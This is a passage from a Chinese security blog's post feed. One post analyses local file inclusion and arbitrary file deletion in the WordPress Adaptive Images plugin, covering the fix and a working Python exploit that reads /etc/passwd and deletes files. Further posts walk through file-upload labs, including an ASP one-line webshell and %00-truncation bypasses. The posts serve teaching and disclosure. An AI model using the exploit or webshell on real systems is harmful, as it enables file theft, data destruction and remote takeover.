$debug,</span><br><span class="line">                &apos;resolutions&apos;    =&gt; $resolutions,</span><br><span class="line">                &apos;cache_dir&apos;      =&gt; $cache_dir,</span><br><span class="line">                &apos;jpg_quality&apos;    =&gt; $jpg_quality,</span><br><span class="line">                &apos;png8&apos;           =&gt; $png8,</span><br><span class="line">                &apos;sharpen&apos;        =&gt; $sharpen,</span><br><span class="line">                &apos;watch_cache&apos;    =&gt; $watch_cache,</span><br><span class="line">                &apos;browser_cache&apos;  =&gt; $browser_cache,</span><br><span class="line">                &apos;request_uri&apos;    =&gt; $request_uri,</span><br><span class="line">                &apos;source_file&apos;    =&gt; $source_file,</span><br><span class="line">                &apos;wp_content&apos;     =&gt; $wp_content_dir,</span><br><span class="line">                &apos;client_width&apos;   =&gt; $client_width,</span><br><span class="line">                &apos;hidpi&apos;          =&gt; $hidpi,</span><br><span class="line">                &apos;pixel_density&apos;  =&gt; $pixel_density,</span><br><span class="line">                &apos;resolution&apos;     =&gt; $resolution</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        return $_REQUEST[&apos;adaptive-images-settings&apos;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.1 函数 adaptive_images_script_get_settings 用于获取脚本的配置参数；</p><p>1.2 语句 if ( ! isset( $_REQUEST[‘adaptive-images-settings’] ) )，通过 isset 方法来判断变量$_REQUEST[‘adaptive-images-settings’] ) 是否存在且其值是否为 NULL。如果该变量不存在或者其值为 NULL，那么则根据默认配置来重写并组合它，最后返回变量$_REQUEST[‘adaptive-images-settings’] 的值。</p><p>1.3 如果变量$_REQUEST[‘adaptive-images-settings’] ) 存在且其值不为 NULL，那么就直接返回该变量的值。于是问题来了，什么情况下$_REQUEST[‘adaptive-images-settings’] ) 存在且其值不为 NULL？在有人蓄意构造的情况下，该变量一定是存在且其值不为 NULL。通过控制此变量，黑客可以利用这两个漏洞进行恶意攻击。</p><p>\2. 第二段源代码具体如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$settings = adaptive_images_script_get_settings();</span><br></pre></td></tr></table></figure><p>通过调用函数 adaptive_images_script_get_settings() 来给变量$settings 赋值，这样攻击者蓄意构造的参数就被传导到了全局。</p><p>\3. 第三段源代码具体如下所示（文件包含漏洞产生）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    if ( ! isset( $_GET[&apos;resolution&apos;] ) &amp;&amp; ! isset( $_COOKIE[&apos;resolution&apos;] ) ) &#123; </span><br><span class="line">        adaptive_images_script_send_image( $settings[&apos;source_file&apos;], $settings[&apos;browser_cache&apos;] );</span><br><span class="line">        exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.1 调用 adaptive_images_script_send_image 函数，将 source_file 的内容发送给客户端，正常情况下，source_file 的内容是图片文件。</p><p>3.2 通过设置参数$settings[‘source_file’]（也就是$_REQUEST[‘adaptive-images-settings’][‘source_file’]），攻击者就可以利用文件包含漏洞了。</p><p>\4. 第四段源代码具体如下所示（任意文件删除漏洞产生）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    $cache_file = $settings[&apos;wp_content&apos;] . &apos;/&apos; . $settings[&apos;cache_dir&apos;] . &apos;/&apos; . $settings[&apos;resolution&apos;] . $settings[&apos;request_uri&apos;];</span><br><span class="line">    if ( file_exists( $cache_file ) ) &#123; </span><br><span class="line">        </span><br><span class="line">        if ( $settings[&apos;watch_cache&apos;] ) &#123; </span><br><span class="line">            adaptive_images_delete_stale_cache_image( $settings[&apos;source_file&apos;], $cache_file, $settings[&apos;resolution&apos;] );</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.1 将$settings 中的各个参数值拼接起来后，赋值给变量$cache_file，此时攻击者构造的参数值也就已经传入变量$cache_file 中。</p><p>4.2 然后调用 adaptive_images_delete_stale_cache_image 函数，攻击者就可以利用任意文件删除漏洞来删除相应的文件。</p><p>\5. 函数 adaptive_images_delete_stale_cache_image 的源代码具体如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    function adaptive_images_delete_stale_cache_image ( $source_file, $cache_file, $resolution ) &#123;</span><br><span class="line">        if ( file_exists( $cache_file ) ) &#123;</span><br><span class="line">            if ( filemtime( $cache_file ) &gt;= filemtime( $source_file ) ) &#123;</span><br><span class="line">                return $cache_file;</span><br><span class="line">            &#125;</span><br><span class="line">            unlink( $cache_file );</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果缓存文件新于源文件，那么函数返回缓存文件；否则，使用 unlink 函数删除缓存文件。这里 $cache_file 和$source_file 都可以特意构造，将想要删除的文件赋值给$cache_file，就可以实现任意文件的删除操作。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>针对版本号&lt;=0.6.66 的插件中存在的这两个漏洞，建议及时将 adaptive images 更新到 0.6.67。在 0.6.67 版本中，问题代码得到了修复，修复后的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">    global $settings;</span><br><span class="line">    $settings = NULL;</span><br><span class="line">    function adaptive_images_script_get_settings () &#123;</span><br><span class="line">        $current_directory  = dirname( $_SERVER[&apos;SCRIPT_FILENAME&apos;] );</span><br><span class="line">        $resolutions    = array( 1024, 600, 480 );</span><br><span class="line">        $landscape      = TRUE;</span><br><span class="line">        $hidpi          = TRUE;</span><br><span class="line">        $wp_content_dir = realpath( $current_directory . &apos;/../../&apos; );</span><br><span class="line">        $wp_content_url = &apos;http://&apos; . $_SERVER[&apos;HTTP_HOST&apos;] . &apos;/wp-content&apos;;</span><br><span class="line">        $cache_dir      = &quot;cache/adaptive-images&quot;;</span><br><span class="line">        $jpg_quality    = 65;</span><br><span class="line">        $png8           = FALSE;</span><br><span class="line">        $sharpen        = TRUE;</span><br><span class="line">        $watch_cache    = TRUE;</span><br><span class="line">        $browser_cache  = 60*60*24*7;</span><br><span class="line">        $user_settings_file = realpath( $current_directory . &apos;/user-settings.php&apos; );</span><br><span class="line">        if ( file_exists( $user_settings_file ) ) &#123;</span><br><span class="line">            include( &apos;user-settings.php&apos; );</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $request_uri    = parse_url( urldecode( $_SERVER[&apos;REQUEST_URI&apos;] ), PHP_URL_PATH );</span><br><span class="line">        $wp_content_url = preg_replace( &apos;/^https?/&apos;,  &apos;&apos;, $wp_content_url );</span><br><span class="line">        $url            = preg_replace( &apos;/^https?/&apos;,  &apos;&apos;, adaptive_images_script_get_url() . $request_uri );</span><br><span class="line">        $source_file    = str_ireplace( $wp_content_url, $wp_content_dir, $url );</span><br><span class="line">        </span><br><span class="line">        if ( isset( $_GET[&apos;resolution&apos;] ) ) &#123;</span><br><span class="line">            </span><br><span class="line">            $cookie_resolution = $_GET[&apos;resolution&apos;];</span><br><span class="line">        &#125; else if ( isset( $_COOKIE[&apos;resolution&apos;] ) ) &#123; </span><br><span class="line">            $cookie_resolution = $_COOKIE[&apos;resolution&apos;];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $cookie_resolution = null;</span><br><span class="line">        &#125;</span><br><span class="line">        $client_width  = $resolutions[0];</span><br><span class="line">        $pixel_density = 1;</span><br><span class="line">        if ( ! isset( $cookie_resolution ) || isset( $cookie_resolution ) &amp;&amp; ! preg_match( &quot;/^[\d]+[,]+[\d]+[\.]?[\d]*$/&quot;, $cookie_resolution ) ) &#123; </span><br><span class="line">            setcookie( &apos;resolution&apos;, &apos;&apos;, time() - 100 );</span><br><span class="line">        &#125; else &#123; </span><br><span class="line">            $cookie_array = explode( &apos;,&apos;, $cookie_resolution );</span><br><span class="line">            if ( count( $cookie_array ) &gt; 0 ) &#123; </span><br><span class="line">                $client_width  = intval( $cookie_array[0] );</span><br><span class="line">            &#125;</span><br><span class="line">            if ( $hidpi ) &#123; </span><br><span class="line">                if ( count( $cookie_array ) &gt; 1 ) &#123; </span><br><span class="line">                    $pixel_density = $cookie_array[1];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $client_width_scaled = $client_width * $pixel_density;</span><br><span class="line">        $resolution = $resolutions[0];</span><br><span class="line">        foreach ( $resolutions as $breakpoint ) &#123;</span><br><span class="line">            if ( $client_width_scaled &lt;= $breakpoint ) &#123;</span><br><span class="line">                $resolution = $breakpoint;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $debug = isset( $_GET[&apos;debug&apos;] ) ? $_GET[&apos;debug&apos;] : FALSE;</span><br><span class="line">        global $settings;</span><br><span class="line">        $settings = array( </span><br><span class="line">            &apos;debug&apos;          =&gt; $debug,</span><br><span class="line">            &apos;resolutions&apos;    =&gt; $resolutions,</span><br><span class="line">            &apos;cache_dir&apos;      =&gt; $cache_dir,</span><br><span class="line">            &apos;jpg_quality&apos;    =&gt; $jpg_quality,</span><br><span class="line">            &apos;png8&apos;           =&gt; $png8,</span><br><span class="line">            &apos;sharpen&apos;        =&gt; $sharpen,</span><br><span class="line">            &apos;watch_cache&apos;    =&gt; $watch_cache,</span><br><span class="line">            &apos;browser_cache&apos;  =&gt; $browser_cache,</span><br><span class="line">            &apos;request_uri&apos;    =&gt; $request_uri,</span><br><span class="line">            &apos;source_file&apos;    =&gt; $source_file,</span><br><span class="line">            &apos;wp_content&apos;     =&gt; $wp_content_dir,</span><br><span class="line">            &apos;client_width&apos;   =&gt; $client_width,</span><br><span class="line">            &apos;hidpi&apos;          =&gt; $hidpi,</span><br><span class="line">            &apos;pixel_density&apos;  =&gt; $pixel_density,</span><br><span class="line">            &apos;resolution&apos;     =&gt; $resolution</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这其中的改进主要有以下两点：</p><blockquote><p>第一、删除局部变量$_REQUEST[‘adaptive-images-settings’]，改用全局变量$settings，同时删除该函数的返回值；</p><p>第二、删除条件判断语句 if ( ! isset( $_REQUEST[‘adaptive-images-settings’] ) )，全局变量$settings 的值需要由函数生成，这样就阻断了通过 URL 蓄意构造参数值的途径，文件包含漏洞和任意文件删除漏洞也就得以修复。</p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>\1. 漏洞利用的 exp 具体如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">print &quot;\n[*] Adaptive images &lt;=0.6.66 for WordPress PoC: LFI and arbitrary file deletion By Neroqi&quot;</span><br><span class="line">server_ip = raw_input(&apos;输入服务器 IP 地址：&apos;)</span><br><span class="line">option = raw_input(&apos;文件包含请输入 1，文件删除请输入 2：&apos;)</span><br><span class="line">if option == &apos;1&apos;:</span><br><span class="line">    source_file1 = raw_input(&apos;输入包含路径和文件名：&apos;)</span><br><span class="line">    exp1 = requests.get(&quot;http://&quot; + server_ip + &quot;/wordpress/wp-content/uploads/2019/10/timg.jpg?adaptive-images-settings[source_file]=&quot; + source_file1)</span><br><span class="line">    print exp1.text</span><br><span class="line">elif option == &apos;2&apos;:</span><br><span class="line">    source_file2 = raw_input(&apos;输入源文件的路径及文件名：&apos;)</span><br><span class="line">    cache_dir = raw_input(&apos;输入要删除文件的路径：&apos;)</span><br><span class="line">    cache_file = raw_input(&apos;输入要删除文件的文件名：&apos;)</span><br><span class="line">    requests.get(&quot;http://&quot; + server_ip + &quot;/wordpress/wp-content/uploads/2019/10/timg2.jpg?adaptive-images-settings[source_file]=&quot; + source_file2 + &quot;&amp;adaptive-images-settings[resolution]=&amp;resolution=16000&amp;adaptive-images-settings[wp_content]=.&amp;adaptive-images-settings[cache_dir]=&quot; + cache_dir + &quot;&amp;adaptive-images-settings[request_uri]=&quot; + cache_file + &quot;&amp;adaptive-images-settings[watch_cache]=1&quot;)</span><br><span class="line">    exp2 = requests.get(&quot;http://&quot; + server_ip + &quot;/wordpress/wp-content/uploads/2019/10/timg2.jpg?adaptive-images-settings[source_file]=&quot; + cache_file)</span><br><span class="line">    print exp2.text</span><br><span class="line">else:</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><p>\2. 首先输入服务器的 IP 地址，然后输入 option 值，当 option 的值为 1 时，exp 对 LFI 漏洞进行利用，这里我们成功地包含了/etc/passwd，结果如下图所示：<img src="https://image.3001.net/images/20191018/1571403230_5da9b5ded6c3a.png!small" alt="img">再次对/proc/version 进行包含，服务器返回了 Linux 的系统版本信息，结果如下图所示：<img src="https://image.3001.net/images/20191018/1571403245_5da9b5edbba47.png!small" alt="img">3. 当 option 的值为 2 时，exp 对任意文件删除漏洞进行利用，分别输入源文件的路径及文件名、要删除文件的路径及文件名，这里源文件的路径及文件名输入../../../wp-content/uploads/2019/10/timg2.jpg，要删除文件的路径及文件名分别输入../../.. 和 test.php，文件 timg2.jpg 比 test.php 新。在执行完删除操作之后，使用文件包含去确认是否删除成功，结果如下图所示：<img src="https://image.3001.net/images/20191018/1571403262_5da9b5fea48a6.png!small" alt="img"></p><p>「Original image not found or not available」说明 test.php 已经被成功删除。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>在编码过程中使用条件判断语句时，一定要注意使用规范和代码逻辑，不能够允许终端用户进行越权操作，特殊的文件操作行为要限定特定用户才有权限，比如后台删除文件的操作，必须限制管理员才能操作，否则可能产生漏洞，影响系统安全。</p><hr><p>原文链接： <a href="https://www.freebuf.com/vuls/217359.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/217359.html</a> </p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞----解析、验证伪造 三</title>
      <link href="/2019/10/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E4%BC%AA%E9%80%A0%E4%B8%89/"/>
      <url>/2019/10/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E4%BC%AA%E9%80%A0%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="文件上传漏洞–-gt-接上篇博客"><a href="#文件上传漏洞–-gt-接上篇博客" class="headerlink" title="文件上传漏洞–&gt;接上篇博客"></a>文件上传漏洞–&gt;接上篇博客</h1><h2 id="20、21、23IIS6-0解析漏洞"><a href="#20、21、23IIS6-0解析漏洞" class="headerlink" title="20、21、23IIS6.0解析漏洞"></a>20、21、23IIS6.0解析漏洞</h2><ul><li>在文件夹为 asp, asa 内的所有文件都会被当成asp脚本进行解析;</li><li>文件名如：xxx.asp;yyy.jpg 的文件，会忽略分号后面的后缀，将该文件当成asp脚本进行解析</li><li>asa、cer、cdx 也会被当成asp脚本进行解析</li></ul><h3 id="附上源码："><a href="#附上源码：" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>,<span class="string">"asa"</span>,<span class="string">"cer"</span>,<span class="string">"cdx"</span>);</span><br><span class="line">$temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line"><span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>];</span><br><span class="line">$extension = end($temp);     <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">&amp;&amp; in_array($extension, $allowedExts))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传文件名: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件类型: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件大小: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" kB"</span>;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="string">"./a/image/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" 文件已经存在。 "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">            $ret = move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"image/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . <span class="string">"./a/image/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><p>可以看到支持上传的后缀名有：gif、jpeg、jpg、png、asa、cer、cdx，但同时还要满足http请求头Content-Type的值为 image/jpg 、image/png 等图片类型。</p><p>20、直接将一句话木马保存为 xxx.cer 文件,改http请求头Content-Type的值为image/jpg 、image/png 等即可。</p><p>21、xxx.asp;yyy.jpg 的文件</p><p>23、 asp, asa 内的所有文件都会被当成asp脚本进行解析，所以直接上传图片马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;a&quot;)%&gt;</span><br></pre></td></tr></table></figure><h2 id="24、解析漏洞（四）"><a href="#24、解析漏洞（四）" class="headerlink" title="24、解析漏洞（四）"></a>24、解析漏洞（四）</h2><p>在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于C:wampbinphpphp5.3.10php.ini，默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析，也就是说可以这样，上传合法的“图片”（图片木马）然后在URL后面加上“/xxx.php”，就可以获得网站的WebShell。</p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞----解析、验证伪造 二</title>
      <link href="/2019/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E4%BC%AA%E9%80%A0%E4%BA%8C/"/>
      <url>/2019/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E4%BC%AA%E9%80%A0%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="文件上传漏洞–-gt-接上篇博客"><a href="#文件上传漏洞–-gt-接上篇博客" class="headerlink" title="文件上传漏洞–&gt;接上篇博客"></a>文件上传漏洞–&gt;接上篇博客</h1><h2 id="11、-00截断绕过"><a href="#11、-00截断绕过" class="headerlink" title="11、%00截断绕过"></a>11、%00截断绕过</h2><p>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。</p><h3 id="附上源码："><a href="#附上源码：" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">    $file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">        $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &apos;上传失败！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><p>在POST做00截断</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload01.png" alt="躲起来了"></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload02.png" alt></p><h2 id="12、-00截断绕过-二"><a href="#12、-00截断绕过-二" class="headerlink" title="12、%00截断绕过(二)"></a>12、%00截断绕过(二)</h2><p>和上关差不多，这里用Hex改为00就行了</p><h3 id="附上源码：-1"><a href="#附上源码：-1" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">    $file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">        $img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法：-1"><a href="#方法：-1" class="headerlink" title="方法："></a>方法：</h3><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload03.png" alt="躲起来了"></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload04.png" alt="躲起来了"></p><h2 id="13-16、（图片马绕过）（getimagesize图片类型绕过）（php-exif模块图片类型绕过）（二次渲染绕过）"><a 